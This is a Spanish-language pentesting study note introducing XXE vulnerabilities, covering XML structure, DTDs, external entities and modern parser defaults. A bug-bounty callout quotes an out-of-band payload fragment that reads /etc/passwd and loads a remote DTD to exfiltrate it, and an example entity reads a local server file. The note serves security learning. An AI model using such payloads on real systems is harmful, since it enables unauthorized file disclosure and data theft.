---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - XXE
  - Tipo/Introduccion
Descripción: "Una vulnerabilidad XXE (XML External Entity) ocurre cuando una app procesa datos XML controlados por el usuario sin sanearlos ni parsearlos de forma segura, permitiéndonos…"
Fecha de actualización: 2026-07-15
Nota previa: "[[13 - Herramientas para IDOR]]"
Nota siguiente: "[[15 - Divulgación de archivos locales]]"
Area: "[[Web Attacks.base|Web Attacks]]"
---
---

<mark style="background: #ADCCFFA6;">Una vulnerabilidad `XXE` (XML External Entity) ocurre cuando una app procesa datos `XML` controlados por el usuario sin sanearlos ni parsearlos de forma segura</mark>, permitiéndonos abusar de características del propio XML. El impacto va desde <mark style="background: #FFB86CA6;">leer ficheros sensibles del servidor hasta `SSRF`, robo de credenciales y `RCE`</mark>, o tumbar el servidor por `DoS`. Está en el OWASP Top 10.

> [!example]+ Caso real — Facebook XXE con Word · $6.300
> Mohamed Ramadan subió un `.docx` (que por dentro es un ZIP de XMLs) a la página de empleo de Facebook, con un payload OOB de *parameter entities*: un `<!ENTITY % file SYSTEM "file:///etc/passwd">` más un `<!ENTITY % dtd SYSTEM "http://IP/ext.dtd">` remoto que definía el callback de exfiltración. Los logs de su propio servidor confirmaron que Facebook **resolvió la DTD externa**. **Lección**: prueba XXE en **todo** formato basado en XML (`.docx`, `.xlsx`, `.pptx`, `.svg`), no solo XML crudo; y si rechazan el reporte por "no reproducible", insiste con la evidencia de tus logs.

# XML en 60 segundos

`XML` (Extensible Markup Language) almacena y transporta datos como un **árbol de elementos**: un elemento raíz y sus hijos, cada uno delimitado por una etiqueta. Ejemplo:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
  </recipients>
  <body>Kindly share the invoice...</body>
</email>
```

Piezas clave: **Tag** (`<date>`), **Element** (`<date>...</date>`), **Attribute** (`version="1.0"`), **Declaration** (la primera línea), y **Entity** (variables XML entre `&` y `;`). Los caracteres estructurales (`<`, `>`, `&`, `"`) se escapan como entidades (`&lt;`, `&gt;`, `&amp;`, `&quot;`).

# DTD y entidades: la superficie de ataque

## DTD

Un `DTD` (Document Type Definition) valida la estructura del documento contra un esquema. Puede ir **dentro** del documento o en un **fichero externo** referenciado con `SYSTEM`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

## Entidades personalizadas

Con la palabra clave `ENTITY` definimos "variables" XML, que se referencian con `&nombre;`:

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Al parsear, `&company;` se sustituye por `Inlane Freight`. Hasta aquí, inofensivo.

## Entidades externas — el núcleo del XXE

<mark style="background: #FF5582A6;">La clave está en `SYSTEM`: una entidad puede apuntar a un recurso **externo** — una URL o un fichero local</mark>:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

Cuando el parser resuelve `&signature;`, lo reemplaza por el **contenido del fichero** `signature.txt` del servidor. Si ese valor acaba reflejándose en la respuesta (formularios web, APIs `SOAP`/XML), <mark style="background: #8000E1A6;">acabamos leyendo ficheros arbitrarios del back-end</mark>. Existe también `PUBLIC` (para entidades declaradas públicamente), pero en la práctica usaremos `SYSTEM`.

# Relevancia moderna (leer con atención)

> [!warning]+ XXE ha cambiado mucho desde 2021
> El módulo HTB asume parsers permisivos. Hoy, <mark style="background: #FFB8EBA6;">la mayoría de parsers deshabilitan las entidades externas **por defecto**</mark>:
> - **PHP**: desde `libxml2 2.9` las entidades externas están desactivadas por defecto. El XXE clásico en PHP requiere `libxml_disable_entity_loader(false)` o versiones viejas.
> - **Java**: es el ecosistema **más vulnerable**. Muchos parsers (`DocumentBuilderFactory`, `SAXParser`, `XMLReader`) vienen inseguros por defecto salvo que se active `FEATURE_SECURE_PROCESSING` o se deshabiliten DTDs. Java además permite listar directorios y usar `jar://`/`netdoc://`.
> - **.NET**: seguro desde `.NET 4.5.2`; vulnerable en versiones anteriores o con `XmlResolver` explícito.
>
> Dónde sigue vivo el XXE en 2026: **SOAP**, **SAML** (autenticación federada), **SVG** (subida de imágenes), documentos **OOXML** (`.docx`, `.xlsx`, `.pptx` son ZIP con XML dentro), **RSS/Atom**, `XML-RPC`, feeds de configuración, y cualquier endpoint que acepte `Content-Type: application/xml` aunque no lo anuncie.

En términos de OWASP, XXE pasó de ser categoría propia (`A4:2017`) a integrarse en `A05:2021 – Security Misconfiguration`, reflejando justo que hoy es un problema de **configuración del parser** más que de diseño. Empezamos por el ataque base: [[15 - Divulgación de archivos locales|divulgación de archivos locales]].

## Referencias

- OWASP — [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- PortSwigger — [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)
- HackTricks — [XXE - XEE - XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
- HTB Academy — *Web Attacks* (base, 2021)
